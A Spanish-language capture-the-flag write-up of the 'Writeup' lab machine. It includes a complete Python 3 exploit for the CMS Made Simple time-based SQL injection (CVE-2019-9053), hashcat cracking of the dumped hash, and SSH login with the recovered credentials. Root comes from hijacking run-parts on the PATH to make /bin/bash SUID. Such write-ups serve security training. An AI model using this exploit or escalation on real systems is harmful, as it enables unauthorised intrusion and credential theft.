
# 🕵️‍♂️ Reconocimiento

Comenzamos con el escaneo de puertos utilizando `nmap`:

```bash
nmap -p- --open -sS -Pn -vvv -n --min-rate 5000 10.10.10.138 -oG allports
nmap -sCV -p80,22 10.10.10.138
```

![[Writeup1.png]]

El resultado indica que los puertos **22 (SSH)** y **80 (HTTP)** están abiertos.

Esto nos permite acceder a:

- 🌐 Página principal: [http://10.10.10.138/](http://10.10.10.138/)
- 📄 Archivo `robots.txt`: [http://10.10.10.138/robots.txt](http://10.10.10.138/robots.txt)

---

Al entrar a la página principal vemos que tiene una protección anti-DDoS que bloquea la enumeración.  
Probamos fuzzing con `ffuf` y `gobuster`, pero no obtuvimos resultados útiles.

![[Writeup2.png]]

Sin embargo, al ingresar a `robots.txt` encontramos una ruta interesante:

- [http://10.10.10.138/writeup/](http://10.10.10.138/writeup/)

![[Writeup3.png]]

Al inspeccionar el código fuente del sitio `/writeup`, vemos que el CMS utilizado es **CMS Made Simple**.  
El pie de página indica un copyright de 2004–2019.

![[Writeup4.png]]

---

# 🔍 Búsqueda de vulnerabilidades

Buscamos en `searchsploit`:

```bash
searchsploit CMS Made Simple
```

Encontramos una vulnerabilidad de **inyección SQL no autenticada** en la versión **2.2.10** (CVE-2019-9053).

![[Writeup5.png]]

La copiamos con:

```bash
searchsploit -m php/webapps/46635.py
```

El exploit original es para Python 2.7, pero lo convertimos a Python 3.

---

# 🐍 Exploit en Python 3

Guardamos el siguiente código como `exploit.py`:

```python
#!/usr/bin/env python3
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import argparse
import hashlib

# Usamos argparse en lugar de optparse (más moderno)
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True, help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_argument('-w', '--wordlist', help="Wordlist for crack admin password")
parser.add_argument('-c', '--crack', action="store_true", help="Crack password with wordlist", default=False)

args = parser.parse_args()

url_vuln = args.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if args.wordlist:
    wordlist += args.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    with open(wordlist) as dict_file:
        for line in dict_file.readlines():
            line = line.strip()
            beautify_print_try(line)
            if hashlib.md5((str(salt) + line).encode('utf-8')).hexdigest() == password:
                output += "\n[+] Password cracked: " + line
                break

def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c")
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = f"a,b,1,5))+and+(select+sleep({str(TIME)})+from+cms_siteprefs+where+sitepref_value+like+0x{ord_salt_temp}25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = f"a,b,1,5))+and+(select+sleep({str(TIME)})+from+cms_users+where+password+like+0x{ord_password_temp}25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = f"a,b,1,5))+and+(select+sleep({str(TIME)})+from+cms_users+where+username+like+0x{ord_db_name_temp}25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = f"a,b,1,5))+and+(select+sleep({str(TIME)})+from+cms_users+where+email+like+0x{ord_email_temp}25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if args.crack:
    print(colored("[*] Now try to crack password", 'yellow'))
    crack_password()

beautify_print()

```

Ejecutamos el script con:

```bash
python3 exploit.py -u http://10.10.10.138/writeup/ -w /usr/share/wordlists/rockyou.txt
```

> 🔧 El parámetro `-u` es para la URL objetivo y `-w` es para el diccionario.  
> ⚙️ Modificamos `TIME = 1` a `TIME = 2` para evitar falsos positivos.

![[Writeup6.png]]

---

# 🧂 Resultado del exploit

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

---

# 🔓 Crackear contraseña con Hashcat

Hash probable: **MD5**

Contenido del archivo `hash`:

```
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
```

Ejecutamos Hashcat:

```bash
hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
```

Resultado:

```
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```

- Usuario: `jkr`
- Contraseña: `raykayjay9`

![[Writeup7.png]]

---

# 💻 Intrusión por SSH

```bash
ssh jkr@10.10.10.138
# Contraseña: raykayjay9
```

![[Writeup8.png]]

---

# 🔼 Escalada de privilegios

Con `pspy32` vemos ejecución automática de `run-parts` al iniciar sesión. [[PSPY]]

![[Writeup9.png]]

Verificamos ubicación:

```bash
which run-parts
```

Confirmamos que `/usr/local/bin` está antes en `PATH`.

![[Writeup10.png]]

El grupo `staff` permite modificar `/usr/local`.

![[Writeup 11.png]]

### Path Hijacking

Creamos el archivo:

```bash
nano /usr/local/bin/run-parts
```

Contenido:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Permisos:

```bash
chmod +x /usr/local/bin/run-parts
```

Conectamos por SSH y ejecutamos:

```bash
bash -p
```

Leemos la flag:

```bash
cat /root/root.txt
```

---

# 🧠 Notas

## ¿Qué es un salt?

Un **salt** es una **cadena aleatoria** añadida a una contraseña antes de hashearla.  
Evita colisiones y protege contra ataques con rainbow tables.

---

## Identificación de hashes

| Tipo de Hash | Longitud | Ejemplo |
|--------------|----------|---------|
| **MD5**      | 32       | `5f4dcc3b5aa765d61d8327deb882cf99` |
| **SHA-1**    | 40       | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| **SHA-256**  | 64       | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd7...` |
| **SHA-512**  | 128      | `cf83e1357eefb8bd...` |
| **NTLM**     | 32       | `32ed87bdb5fdc5e9cba88547376818d4` |
| **bcrypt**   | 60       | `$2y$10$e0NRW5B8...` |
| **LM hash**  | 32       | Solo letras mayúsculas y números |

---

# 📂 Hashes crackeados

Buscar archivo:

```bash
find / -name "hashcat.potfile" 2>/dev/null
```

Ver contenido:

```bash
cat /root/.local/share/hashcat/hashcat.potfile
```

---

# 🔧 Comandos útiles

## `ps`

```bash
ps -eo user,command
```

- `-e`: muestra todos los procesos
- `-o user,command`: columnas específicas

---

## `crontab`

```bash
cat /etc/crontab
```

---

# 📚 Créditos

- [🎥 Video 1](https://www.youtube.com/watch?v=sG7_MYqAcu0)
- [🎥 Video 2](https://www.youtube.com/watch?v=zJF61aNYFb8)
- [🎥 Video 3](https://www.youtube.com/watch?v=GKq4cwBfH24)
- Writeup oficial
